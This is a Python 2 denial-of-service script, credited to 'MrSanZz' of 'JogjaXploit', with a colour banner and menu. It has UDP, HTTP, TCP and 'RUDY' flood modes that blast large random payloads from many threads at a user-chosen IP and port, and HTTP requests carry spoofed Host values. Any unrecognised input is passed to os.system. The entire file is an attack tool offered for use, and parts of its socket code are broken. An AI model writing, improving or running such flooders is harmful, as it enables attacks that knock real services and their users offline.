import socket, threading, os, random

if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')

def logo():
    print("\033[1;32m     ___  ___  ____  __  ____")
    print("\033[1;91m    / _ \/ _ \/ __ \/ / / / /")
    print("\033[1;34m   / // / // / /_/ / /_/_  _/")
    print("\033[1;33m  /____/____/\____/____//_/  ")
logo()                           
print("\n")
print("\033[1;34m_"*33)
print("\033[1;32mExists Method:")
print("1.HTTP")
print("2.UDP")
print("3.TCP")
print("4.RUDY")
print("\033[1;34m_"*33)
print("\t\t\033[37mMade By MrSanZz")
print("\tTeam : \033[1;91mJogjaXploit\033[37m")
print("Write exit For Exit")
print("\n")
while True:
    try:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        rudy1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        rudy2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        byte = random._urandom(60000)
        byte2 = random._urandom(50000)
        sent = 5000
        fakeit = ['192.168.1.1','192.154.4.4','192.167.1.4','192.155.3.3']
        prompt = raw_input("\033[1;34mL4@root \033[1;33m~$ \033[37m")
        if prompt.lower() == "udp":
            print "\033[1;33mUDP Mode"
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bytes = input("Bytes Per Sec : ")
         
            def fluud():
                try:
                    udp.sendto(byte, (ip,port))
                    for i in range(bytes):
                        udp.sendto(byte, (ip,port))
                    print "\033[1;91mSending %s Botnet | Target %s Port %s sent %s"%(sent,ip,port)
                except KeyboardInterrupt:
                    exit()
                except:
                    print "\033[1;33m[ UDP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thr = threading.Thread(target=fluud)
                thr.start()
        elif prompt.lower() == "http":
            print "\033[1;33mHTTP Mode"
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bytes = int(input("Bytes Per Sec : "))
        
            def flood():
                for e in fakeit:
                    try:
                        rudy2.sendto(byte, (ip,port))
                        for i in range(bytes):
                            rudy2.sendto(byte, (ip,port))
                        http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
                        http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
                        for i in range(thread):
                            http.send(byte)    
                        print "\033[1;91mSending %s Botnet | Target %s Port %s"%(sent,ip,port)
                    except:
                        print "\033[1;33m[ HTTP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thr = threading.Thread(target=flood)
                thr.start()
        elif prompt.lower() == "tcp":
            print "\033[1;33mTCP Mode"
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bytes = input("Bytes Per Sec : ")
        
            def flttd():
                for e in fakeit:
                    try:
                        tcp.sendto(byte, (ip,port))
                        for i in range(bytes):
                            tcp.send(byte)
                        print "\033[1;91mSending %s Botnet | Target %s Port %s"%(sent,ip,port)
                    except KeyboardInterrupt:
                        exit()
                    except:
                        print "\033[1;33m[ TCP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thr = threading.Thread(target=flttd)
                thr.start()
        elif prompt.lower() == "rudy":
            print "\033[1;32mRUDY Method Selected"
            sent = 5000
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            bytes = int(input("Byte Per Sec : "))
            thread = input("Threads : ")
            
            def rudy():
                for e in fakeit:
                    try:
                        rudy2.sendto(byte, (ip,port))
                        for i in range(bytes):
                            rudy2.sendto(byte, (ip,port))
                        http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
                        http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
                        for i in range(thread):
                            http.send(byte)    
                        print "\033[1;33m[ RUDY ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
                    except:
                        print "\033[1;33m[ RUDY ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thread = threading.Thread(target=rudy)
                thread.start()    
        elif prompt.lower() == "exit":
            exit()       
        else:
            os.system(prompt)   
    except SyntaxError:
        print("Use python2!!")
        continue           
    except KeyboardInterrupt:
        continue
